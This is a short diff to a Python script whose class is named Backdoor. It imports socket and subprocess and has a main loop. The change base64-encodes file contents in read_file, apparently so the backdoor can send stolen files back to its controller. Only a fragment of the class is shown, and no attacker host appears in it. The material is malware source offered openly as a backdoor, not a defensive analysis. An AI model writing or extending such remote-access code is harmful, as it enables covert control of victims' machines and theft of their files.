@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json, os
+import socket, subprocess, json, os, base64
 
 
 class Backdoor:
@@ -30,7 +30,7 @@ class Backdoor:
 
 	def read_file(self, path):
 		with open(path, "rb") as file:
-			return file.read()
+			return base64.b64encode(file.read())
 
 	def run(self):
 		while True:
